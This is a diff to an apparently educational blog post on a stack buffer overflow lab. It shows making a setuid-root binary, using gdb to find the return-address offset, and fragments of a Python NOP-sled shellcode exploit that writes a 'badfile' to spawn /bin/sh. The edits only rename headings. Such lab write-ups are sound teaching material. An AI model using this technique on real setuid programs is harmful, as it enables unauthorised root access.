@@ -490,7 +490,7 @@ $ sudo chmod 4755 stack
 -rwsr-xr-x 1 root ychin_chuang 15708 Jan 31 08:10 stack
 </code></pre><p>Use gdb debugger to figure out the distance between the buffer and return address. As you can see, the distance is 0xffffd2a8 - 0xffffd23c  + 4 (the size of ebp) = 112.</p>
 <p><img src="https://github.com/chuang76/image/blob/master/ch2-1.PNG?raw=true" alt=""></p>
-<h2 id="payload">Payload</h2>
+<h2 id="exploit">Exploit</h2>
 <p>The shellcode in the following exploit program aims to execute &ldquo;/bin/sh&rdquo;. We can use NOP-sled as a strategy to hit the start of our shellcode. NOP (0x90) means do nothing in the CPU instruction, so we can just slide in the buffer until reach the shellcode. Note that <code>ret</code> is 0xffffd2a8 plus some number. That is because the gdb pushes some environment data into the stack before running the program. Since the stack grows downwards in x86 processors, the actual frame pointer without debugging mode will be larger than 0xffffd2a8.</p>
 <pre><code>#!/usr/bin/python3
 
@@ -523,7 +523,7 @@ content[offset:offset+L] = (ret).to_bytes(L, byteorder='little')
 
 with open('badfile', 'wb') as f:
     f.write(content)
-</code></pre><h2 id="launch-the-attack">Launch the attack</h2>
+</code></pre><p>So we can launch an attack.</p>
 <pre><code>$ rm badfile
 $ python3 exploit.py 
 $ ./stack 
